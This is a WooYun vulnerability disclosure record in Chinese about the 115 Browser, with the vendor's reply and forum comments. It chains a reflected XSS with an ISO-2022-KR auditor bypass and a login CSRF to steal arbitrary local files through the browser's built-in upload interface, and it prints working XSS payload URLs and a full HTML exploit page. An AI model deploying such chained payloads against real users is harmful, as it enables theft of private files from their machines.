{"id": 71995, "wybug_id": "wooyun-2015-0141347", "wybug_title": "115浏览器设计缺陷可导致远程窃取用户系统上的任意文件", "wybug_corp": "115网盘", "wybug_author": "数据流", "wybug_date": "2015-09-15 17:19", "wybug_open_date": "2015-12-14 21:32", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "逻辑错误", "设计不当", "客户端程序设计错误", "浏览器"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-18：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-11-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-14：\t细节向公众公开  简要描述：  这漏洞两个月前发现的了..我只能说这利用比较猥琐...现在115网盘要强制用115浏览器才能登陆了 (┬＿┬）好狠啊,抓住了人们的刚需 详细说明：  结合了三处缺陷才能触发一:115浏览器结合了115网盘，提供了在浏览器直接登陆115账号的功能\n\n而在浏览器的下载模块添加了115网盘的上传功能\n\n在浏览器登陆115账号的用户可以直接通过浏览器上传本地文件到网盘分析一下 chrome://downloads/#upload的上传功能引用了\nhttp://115.com/static/browser/download/js/upload.js\n那么就代表只要取得115.com的域就有可能操作chrome://downloads/#upload先看看upload.js\nvar init = function () {        _TCache.Uploader = window['uploadInterface'];        if (_TCache.Uploader) {            UPLOAD_CONFIG_NEW.target = \"U_1_0\";            UPLOAD_CONFIG_NEW['use_type'] = 2;            UPLOAD_CONFIG_NEW['file_range'] = {                \"2\": \"0-67108864\", \"1\": \"67108864-0\"            };......        Install: function () {            if (!window['uploadInterface']) {                alert('控件未初始化');                return false;            }            return true;        }    }......\n里面的方法很多 直接调用uploadInterface.CreateUploadDragTask方法来上传文件\nfunction (path, target) {  native function NativeCreateUploadDragTask();  return NativeCreateUploadDragTask(path, target);}\ntarget就是初始化配置里面的UPLOAD_CONFIG_NEW.target = \"U_1_0\";代表在网盘的目录ID\nuploadInterface.CreateUploadDragTask(\"C:\\/xxx\",\"U_1_0\")\n这样就能调用浏览器的上传了\n\n二:上传文件的方法分析出后就要找特权域了刚才提到115.com就是了，直接在主站找到一个反射xss\nhttp://115.com/xhprof/callgraph.php?run=xxx\n但是有chrome 的xss auditor\n\n最近老外爆出的一个bypass也过不了\n<svg><script>/<1/>alert(document.domain)</script></svg>\n这个bypass在最新版的chrome都过了，但是在115浏览器就过不了。后来经@phithon给的一个旧版chrome的bypass绕过了，因为115内置的chrome版本比较老，所以最新的bypass对他也不适用。最后得出的bypass是因为chrome对ISO-2022字符编码没有进行检测所以可以利用ISO-2022的编码来绕过\nhttp://115.com/xhprof/callgraph.php?run=%3Cmeta%20charset=ISO-2022-KR%3E%3Cimg%20src=1%20onerror%0f=alert(1)%3E\n\n\n（此tip在三年前就被老外提出了，现在在chrome早已修复，但有些使用较旧chrome内核的浏览器有可能存在）三：特权域上的xss解决了。另外由于文件是上传到对方账号的网盘上，所以我们要登陆到对方的网盘才可以拿到我们窃取的文件。本来是想着直接利用xss到cookie就可以登陆别人网盘拿到窃取到的东西了,但却发现115启用了httponly\n\n然后就找了好几天能突破httponly的地方,但没有找到.后来就想到了一个猥琐的方法,把对方登陆的网盘账号,换成自己的网盘账号,不就可以拿到盗窃的文件了.这里就想到用csrf的方式来登陆自己的账号,也不需要去分析115的登陆加密算法登陆时直接抓包\n\n把所有字段都写成一个表单自动提交   漏洞证明：  最后给出EXP:\n<html><title>115 Browser Test by 数据流</title><head><script>var img = document.createElement(\"img\");img.src=\"http://passport.115.com/?ac=logout&goto=\";document.body.appendChild(img); //先让对方登陆的账号退出</script></head><form action=\"http://passport.115.com/?ct=login&ac=auth&token=9facc1c735bfd1f90bb535f0dfde1da2&nonce=f6e5664f6601017a830e95d0cafc43fd&account=XXX&time=1442294158\" method=\"POST\"><input type=\"text\" name=\"data\" value=\"xxx\"><input type=\"text\" name=\"goto\" value=\"http://115.com/?mode=wangpan\"></form><script>function login(){document.forms[0].submit();}setTimeout(function() { login(); }, 2000);var i = document.createElement(\"iframe\");i.width=0i.height=0i.src=\"http://115.com/xhprof/callgraph.php?run=%3Cmeta%20charset=ISO-2022-KR%3E%3Cimg%20src=1%20onerror%0f=uploadInterface.CreateUploadDragTask('C:\\/test.txt',%22U_1_0%22)\"document.body.appendChild(i);</script></html>\n以上表单上的字段都要自己抓包去替换哦,生成出来的登陆包数据是长期有效的,短时间内不会失效,可以重复使用登陆.\n\n\n\n成功窃取到指定路径的文件顺便把代码放到我的服务器上吧测试地址:http://115browser.com/115_getfile_wooyun.html   修复方案：  1 修复主站XSS2 加强边界权限控制   版权声明：转载请注明来源 数据流@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-09-15 21:30 厂商回复： 这实质上属于CSRF攻击，利用手法很精彩！但是攻击成本比较高。1）由于验证机制不断加强，采用Cookie登陆等方式基本无效，同时高质量的XSS也很少，所以此处作为CSRF利用；2）客户端加密也在升级中，有几处登陆字段验证暂时没开启，很快上线了；3）最后利用步骤比较麻烦，需要穷举相关文件是否存在。    客户端APP和浏览器还在不断升级中！感谢支持！ ：）    赞下洞主的研究精神。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-09-15 17:20 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  访问一下网页，我硬盘上的苍老师就被你看到了？    \n     2015-09-15 17:23 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1616 漏洞数:187        | 关注技术与网络安全（不收徒，不招人，任何...)\t\t \n  前排来顶！    \n     2015-09-15 17:24 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1334 漏洞数:193        | 。)\t\t \n  好可怕    \n     2015-09-15 17:25 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:232 漏洞数:80        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  最丑的人可以雷劈了    \n     2015-09-15 17:27 |    \t\t数据流  \t\t\t( 普通白帽子  |\t\t\t        Rank:737 漏洞数:92        | 没关系啊，我们还有音乐)\t\t \n  @疯狗 没错    还可以偷走桌面上的所有文件 (/≥▽≤/)    \n     2015-09-15 17:31 |    \t\t班尼路 \t\t\t( 普通白帽子  |\t\t\t        Rank:166 漏洞数:43        | 信息安全爱好者)\t\t \n  @数据流 这么说我桌面上收藏的X片下载地址都被你拿到了？我恨你115就是个流氓 求不用手机扫描 直接绕过浏览器限制登录方法    \n     2015-09-15 17:35 |    \t\t爱上平顶山  \t\t\t( 核心白帽子 |\t\t\t        Rank:2859 漏洞数:569        | [不戴帽子]异乡过客.曾就职于天朝某机构.IT...)\t\t \n  @数据流 刁刁的    \n     2015-09-15 17:37 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:60        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  淡水 淡水    \n     2015-09-15 17:38 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  数据流发红包    \n     2015-09-15 17:40 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1218 漏洞数:322        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  数据流发红包    \n     2015-09-15 17:40 |    \t\t沦沦 \t\t\t( 普通白帽子  |\t\t\t        Rank:586 漏洞数:138        | 爱老婆，爱生活)\t\t \n  数据流 闪电了发红包    \n     2015-09-15 17:45 |    \t\t数据流  \t\t\t( 普通白帽子  |\t\t\t        Rank:737 漏洞数:92        | 没关系啊，我们还有音乐)\t\t \n  @梧桐雨  (｡・`ω´･)     \n     2015-09-15 17:46 |    \t\t数据流  \t\t\t( 普通白帽子  |\t\t\t        Rank:737 漏洞数:92        | 没关系啊，我们还有音乐)\t\t \n  @疯子 丑的人没抢到 我也没办法    \n     2015-09-15 17:50 |    \t\t紫霞仙子 \t\t\t( 普通白帽子  |\t\t\t        Rank:2180 漏洞数:298        | 天天向上 ！！！)\t\t \n  @数据流 我靠，我给你点赞去了，红包就没了，重发。    \n     2015-09-15 18:00 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:372 漏洞数:109        )\t\t \n  mark!!皮肤那个api么    \n     2015-09-15 18:03 |    \t\t聋子 \t\t\t( 普通白帽子  |\t\t\t        Rank:360 漏洞数:69        | 一个聋子)\t\t \n  (┬＿┬）好狠啊,抓住了人们的肛需    \n     2015-09-15 18:54 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1394 漏洞数:123        | 收wb   1：5 无限量收   [平台担保])\t\t \n  这个功能真贴心呢    \n     2015-09-15 18:58 |    \t\t番茄师傅 \t\t\t( 普通白帽子  |\t\t\t        Rank:313 漏洞数:86        | http://www.tomatoyu.com/)\t\t \n  访问一下网页，我硬盘上的苍老师就被你看到了？    \n     2015-09-15 19:14 |    \t\t骑虎打狗 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:4        | 认真对待每个洞..)\t\t \n  那你告诉我 你已经有几位老师了？偷老师好可怕..    \n     2015-09-15 19:18 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:532 漏洞数:79        | 潜心学习~~~)\t\t \n  后排建议数据流发红包^-^    \n     2015-09-15 19:25 |    \t\tOurgame简单 \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:13        | 来打酱油.)\t\t \n  只说，幸亏我不用它。    \n     2015-09-15 19:46 |    \t\tLyleaks \t\t\t( 普通白帽子  |\t\t\t        Rank:167 漏洞数:12        | 我都是按照基本法发洞的)\t\t \n  MARK    \n     2015-09-15 19:50 |    \t\tfox \t\t\t( 普通白帽子  |\t\t\t        Rank:159 漏洞数:16        | fox)\t\t \n  安全登录，防止被盗。请使用115浏览器登录。    \n     2015-09-15 20:15 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1324 漏洞数:332        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  我去，第二步居然把人家的屏幕监控了，洞主也是够6的，第三步那个地方没有写详细哦    \n     2015-09-15 20:16 |    \t\t泪雨无魂 \t\t\t( 普通白帽子  |\t\t\t        Rank:168 漏洞数:47        )\t\t \n  偷老师  好可怕。。    \n     2015-09-15 20:31 |    \t\t我爱水秀天蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:103 漏洞数:15        | 好好学习，天天向上！)\t\t \n  115网盘越来越不想用了，人就是这样，在有选择的情况下，越强迫越不想用。    \n     2015-09-15 20:54 |    \t\t-路人甲- \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:4        | 你的是我的,是我的还是我的，拿走也没用。)\t\t \n  ...115不是现在强制使用浏览器登录么。。利用你这个漏洞既不是。。。    \n     2015-09-15 20:59 |    \t\t一只猿 \t\t\t( 普通白帽子  |\t\t\t        Rank:509 漏洞数:92        | 硬件与无线通信研究方向)\t\t \n  还我的老师    \n     2015-09-15 20:59 |    \t\tYyY \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:4        | YyY)\t\t \n  坚决不用115！！！！！！！！！！！！！赖凌峰放学别走！！！！！！！    \n     2015-09-16 09:06 |    \t\tDNS \t\t\t( 普通白帽子  |\t\t\t        Rank:543 漏洞数:63        | 没有我，你们就去背IP吧)\t\t \n  牛牛牛    \n     2015-09-16 10:04 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  卧槽~~~数据流居然瞒着我们提交漏洞。。。作为群管理员，我有权谴责下你。。。/(ㄒoㄒ)/~~    \n     2015-09-16 10:06 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  师傅  你太伟大了，么么哒~~~    \n     2015-09-16 10:26 |    \t\t数据流  \t\t\t( 普通白帽子  |\t\t\t        Rank:737 漏洞数:92        | 没关系啊，我们还有音乐)\t\t \n  @鬼魅羊羔 ,,Ծ‸Ծ,,        \n     2015-09-16 10:27 |    \t\t数据流  \t\t\t( 普通白帽子  |\t\t\t        Rank:737 漏洞数:92        | 没关系啊，我们还有音乐)\t\t \n  @115网盘 谢谢厂商的夸奖..补充下厂商的回复3 不需要枚举文件名,有方法可以直接上传目录的 o(*≧▽≦)ツ       \n     2015-09-16 11:31 |    \t\tDNS \t\t\t( 普通白帽子  |\t\t\t        Rank:543 漏洞数:63        | 没有我，你们就去背IP吧)\t\t \n  @数据流 刚才我问你PP，原来你就是 T.T    \n     2015-09-18 23:50 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  我靠。。原来我的20T是这么流出去的啊    \n     2015-09-19 00:27 |    \t\tphith0n  \t\t\t( 普通白帽子  |\t\t\t        Rank:672 漏洞数:110        | 一个想当文人的黑客~)\t\t \n  难道只有我看成IIS存在缺陷导致窃取任意文件了么？    \n     2015-09-19 10:01 |    \t\t数据流  \t\t\t( 普通白帽子  |\t\t\t        Rank:737 漏洞数:92        | 没关系啊，我们还有音乐)\t\t \n  @phith0n  是的 就只有你了_(:3 」∠)_    \n     2015-09-19 10:14 |    \t\t大师兄 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:6        | 每日必关注乌云)\t\t \n  @数据流 妈妈问我为什么趴着上网    \n     2015-09-19 16:36 |    \t\t小财 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 我就这样逗逼！)\t\t \n  ( ⊙o⊙ )哇         \n     2015-09-21 08:50 |    \t\t心云 \t\t\t( 普通白帽子  |\t\t\t        Rank:153 漏洞数:49        | Rank:200 漏洞数:55 | Rank:300 漏洞数:70 ...)\t\t \n  真叼    \n     2015-12-07 09:14 |    \t\t进击的zjx \t\t\t( 普通白帽子  |\t\t\t        Rank:1000 漏洞数:130        | 1000rank目标达成！撒花……)\t\t \n  思路真猥琐！牛逼    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}